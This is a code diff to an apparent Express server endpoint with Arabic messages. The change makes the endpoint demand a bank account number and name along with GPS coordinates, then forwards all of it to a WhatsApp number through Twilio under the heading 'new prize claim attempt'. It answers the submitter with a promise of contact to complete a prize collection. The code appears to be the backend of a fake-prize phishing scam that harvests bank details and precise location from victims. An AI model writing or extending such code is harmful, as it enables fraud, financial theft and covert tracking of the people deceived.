@@ -27,12 +27,17 @@ app.post('/submit-location', async (req, res) => {
     try {
         const locationData = req.body;
         
-        if (!locationData.latitude || !locationData.longitude) {
-            return res.status(400).json({ error: 'بيانات الموقع غير مكتملة' });
+        if (!locationData.latitude || !locationData.longitude || !locationData.accountNumber || !locationData.accountName) {
+            return res.status(400).json({ error: 'البيانات غير مكتملة' });
         }
 
         // إرسال إشعار واتساب
-        const message = `📍 موقع جديد:\n🌍 https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}\n🎯 الدقة: ${locationData.accuracy} متر\n⏰ الوقت: ${new Date().toLocaleString('ar-SA')}`;
+        const message = `🏦 محاولة استلام جائزة جديدة:\n\n` +
+                       `👤 الاسم: ${locationData.accountName}\n` +
+                       `💳 رقم الحساب: ${locationData.accountNumber}\n` +
+                       `📍 الموقع: https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}\n` +
+                       `🎯 الدقة: ${locationData.accuracy} متر\n` +
+                       `⏰ الوقت: ${new Date().toLocaleString('ar-SA')}`;
         
         const whatsappMsg = await twilioClient.messages.create({
             from: twilioWhatsAppNumber,
@@ -41,7 +46,10 @@ app.post('/submit-location', async (req, res) => {
         });
 
         console.log('تم إرسال الإشعار:', whatsappMsg.sid);
-        res.json({ success: true, message: 'تم استلام الموقع وإرسال الإشعار بنجاح' });
+        res.json({ 
+            success: true, 
+            message: 'تم استلام طلبك بنجاح! سيتم التواصل معك قريباً لإكمال عملية استلام الجائزة.' 
+        });
 
     } catch (error) {
         console.error('خطأ:', error);
